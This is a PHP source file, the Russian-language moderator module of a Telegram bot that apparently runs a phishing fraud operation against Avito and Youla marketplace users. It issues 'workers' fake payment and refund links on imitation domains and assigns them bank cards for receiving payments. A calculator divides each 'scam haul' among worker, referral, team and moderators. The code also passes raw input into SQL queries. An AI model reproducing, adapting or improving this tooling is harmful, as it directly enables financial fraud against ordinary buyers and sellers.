				// 					$text .= "<b>Telegram ID:</b> <a href=\"tg://user?id=$settings[0]\">$settings[0]</a>\n";
				// 					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 					$text = "💳 <b>Модератор открепил от вас карту — приём платежей не работает</b>";
				// 					send($config['token'], 'sendMessage', Array('chat_id' => $settings[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 					$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту</b> <a href=\"tg://user?id=$settings[0]\">воркеру</a>";
				// 					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 				} else {
				// 					if(mysqli_num_rows($cards) > 0) {
				// 						mysqli_query($connection, "UPDATE `accounts` SET `card` = '$settings[1]' WHERE `telegram` = '$settings[0]'");
				// 						$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил карту воркеру</b>\n\n";
				// 						$text .= "<b>Telegram ID:</b> <a href=\"tg://user?id=$settings[0]\">$settings[0]</a>\n";
				// 						$text .= "<b>Номер карты:</b> <code>".chunk_split($settings[1], 4, ' ')."</code>\n";
				// 						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 						$text = "💳 <b>Модератор закрепил за вами карту — можете воркать</b>";
				// 						send($config['token'], 'sendMessage', Array('chat_id' => $settings[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 						$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил карту </b> <a href=\"tg://user?id=$settings[0]\">воркеру</a>";
				// 						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 					} else {
				// 						$text = "🔑 <b>Карта не найдена или является неактивной</b>";
				// 						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 					}
				// 				}
				// 			} else {
				// 				$text = "🔑 <b>Воркер с таким ID не найден или заблокирован</b>";
				// 				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 			}
				// 		} else {
				// 			$text = "❔ Используйте /setcard <code>[Telegram ID];[Номер карты]</code>";
				// 			send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				// 		}
				// 	}



//====================== МОДЕРКА - минимальная цена ==========================//


					if(preg_match('/\/minprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/minprice \d+$/i', $message['text']) == TRUE) {
							$price = mb_substr($message['text'], 10);

							mysqli_query($connection, "UPDATE `config` SET `min_price` = '$price'");
							$text = "💸 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил минимальную сумму объявления с</b> <code>$settings[min_price] руб.</code> <b>на</b> <code>$price руб.</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /minprice <code>[Минимальная сумма объявления]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - максимальная цена ==========================//


					if(preg_match('/\/maxprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/maxprice \d+$/i', $message['text']) == TRUE) {
							$price = mb_substr($message['text'], 10);

							mysqli_query($connection, "UPDATE `config` SET `max_price` = '$price'");
							$text = "💸 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил максимальную сумму объявления с</b> <code>$settings[max_price] руб.</code> <b>на</b> <code>$price руб.</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /maxprice <code>[Максимальная сумма объявления]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - отправить сообщение ворекру ==========================//



					if(preg_match('/\/msg/i', $message['text']) == TRUE) {
						if(preg_match('/^\/msg (|-)[0-9]+;.+/i', $message['text']) == TRUE) {
							$msg = explode(';', mb_substr($message['text'], 5));

							$text = "✉️ <b>Сообщение от модератора:</b>\n\n";
							$text .= str_replace('\\n', '\n', $msg[1]);
							$send = send($config['token'], 'sendMessage', Array('chat_id' => $msg[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

							if($send->ok) {
								$text = "📨 <b>Ваше сообщение было доставлено воркеру</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = "<b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>отправил сообщение</b> <a href=\"tg://user?id=$msg[0]\">воркеру</a>\n\n";
								$text .= "<b>Текст сообщения:</b> <i>$msg[1]</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "📭 <b>Сообщение не удалось доставить</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /msg <code>[ID воркера];[Текст сообщения]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - добавить баланс ==========================//



					if(preg_match('/\/setbalance/i', $message['text']) == TRUE) {
						if(preg_match('/\/setbalance \d+;\d+/i', $message['text']) == TRUE) {
							$balance = explode(';', mb_substr($message['text'], 12));

							$query = mysqli_query($connection, "SELECT `telegram`, `balance` FROM `accounts` WHERE `telegram` = '$balance[0]'");

							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);
								mysqli_query($connection, "UPDATE `accounts` SET `balance` = '$balance[1]' WHERE `telegram` = '$user[telegram]'");
								$text = "💵 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил баланс</b> <a href=\"tg://user?id=$user[telegram]\">воркеру</a> <b>с</b> <code>$user[balance] руб.</code> <b>на</b> <code>$balance[1] руб.</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = "💵 <b>Модератор обновил вам баланс с</b> <code>$user[balance] руб.</code> <b>на</b> <code>$balance[1] руб.</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😕 <b>Воркер с таким ID не был найден</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /setbalance <code>[ID воркера];[Сумма]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - создать объявление ==========================//


					if(preg_match('/\/create/i', $message['text']) == TRUE) {
						if(preg_match('/\/create \d+;(.{24}|\d{5,64});.+;\d{2,5}(;.+|)/i', $message['text']) == TRUE) {
							$advert = explode(';', mb_substr($message['text'], 8));

							if(empty($advert[4])) $advert[4] = '';

							if(preg_match('/^[0-9]+$/', $edit[1]) == TRUE) {
								$type = '0';
							} elseif(preg_match('/[a-z0-9]{24}/i', $edit[1]) == TRUE) {
								$type = '1';
							} else {
								$type = '0';
							}

							$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert[1]'");
							if(mysqli_num_rows($query) > 0) {
								mysqli_query($connection, "UPDATE `adverts` SET `advert_id` = '$advert[1]', `worker` = '$advert[0]', `title` = '$advert[2]', `image` = '$advert[4]', `price` = '$advert[3]' WHERE `advert_id` = '$advert[1]'");
							} else {
								mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `title`, `image`, `price`, `status`, `time`) VALUES ('$type', '$advert[1]', '$advert[0]', '$advert[2]', '$advert[4]', '$advert[3]', '1', '".time()."')");
							}

							$adverts = mysqli_fetch_assoc($query);

							$text = "⚙️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал объявление для</b> <a href=\"tg://user?id=$advert[0]\">$advert[0]</a>\n\n";
							$text .= "<b>ID объявления:</b> <a href=\"https://www.avito.ru/$advert[1]\">$advert[1]</a>\n";
							$text .= "<b>Название товара:</b> <code>$advert[2]</code>\n";
							$text .= "<b>Сумма (без доставки):</b> <code>$advert[3] руб.</code>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "⚙️ <b>Модератор сгенерировал объявление для вас</b>\n\n";

							if($adverts['type'] == 0) {
								$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$advert[1]\n";
								$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$advert[1]";
							} elseif($advert['type'] == 1) {
								$text .= "<b>Оплата:</b> https://$domains[youla]/product/$advert[1]/buy/delivery\n";
								$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$advert[1]/\n";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $advert[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "⚙️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал объявление для</b> <a href=\"tg://user?id=$advert[0]\">$advert[0]</a>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /create <code>[ID воркера];[ID объявления];[Название товара];[Сумма товара]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - проверить ip ==========================//


					if(preg_match('/\/checkip/i', $message['text']) == TRUE) {
						if(preg_match('/\/checkip (\d{2,3}|[.])+/i', $message['text']) == TRUE) {
							$ip = mb_substr($message['text'], 9);

							$ipapi = json_decode(file_get_contents("http://ip-api.com/json/$ip"));

							if($ipapi->{'status'} == 'success') {
								$text = "ℹ️ <b>Информация об IP адресе</b> <code>$ip</code>\n\n";
								$text .= "Страна: <code>".getCountryFlag($ipapi->{'countryCode'})." ".$ipapi->{'country'}."</code>\n";
								$text .= "Регион: <code>".$ipapi->{'regionName'}."</code>\n";
								$text .= "Город: <code>".$ipapi->{'city'}."</code>\n";
								$text .= "Временная зона: <code>".$ipapi->{'timezone'}."</code>\n";
								$text .= "Провайдер: <code>".$ipapi->{'isp'}."</code>\n\n";
								$text .= "<a href=\"https://www.google.com/maps/@".$ipapi->{'lat'}.",".$ipapi->{'lon'}.",14z\">Посмотреть на Google карте</a>";
							} else {
								$text = "🔎 <b>Информация об IP адресе не найдена</b>";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /checkip <code>[IP адрес]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - калькулятор ==========================//


					if(preg_match('/\/calculate/i', $message['text']) == TRUE) {
						if(preg_match('/\/calculate \d{3,5}/i', $message['text']) == TRUE) {
							$amount = mb_substr($message['text'], 11);

							if($amount >= 750 AND $amount <= 1000000) {
								$amount = floor((95*(1/100)*$amount));
								$payout = floor((75*(1/100)*($amount))/500)*500;
								$referal = floor((2*(1/100)*($amount))/10)*10;
								$profit = floor(($amount)-($payout+$referal));
								$profit1 = floor($profit/2);

								$text = "🧮 <b>Калькулятор выплаты</b>\n\n";
								$text .= "<b>Сумма залёта:</b> <code>$amount руб.</code> <i>(с учётом доставки)</i>\n";
								$text .= "<b>Доля воркера:</b> <code>$payout руб.</code>\n";
								$text .= "<b>Доля реферала:</b> <code>$referal руб.</code>\n";
								$text .= "<b>Доля команды:</b> <code>$profit руб.</code>\n";
								$text .= "<b>Доля одного модератора:</b> <code>$profit1 руб.</code>\n\n";
								$text .= "<i>Расчёты приблизительные и в реальности могут немного отличаться</i>";

								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🧮 Минимальная сумма <code>500 руб.</code> и максимальная сумма <code>1000000 руб.</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /calculate <code>[Сумма]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}
			}
		}
	} else {
		header("Location: https://yandex.ru/");
	}

?>
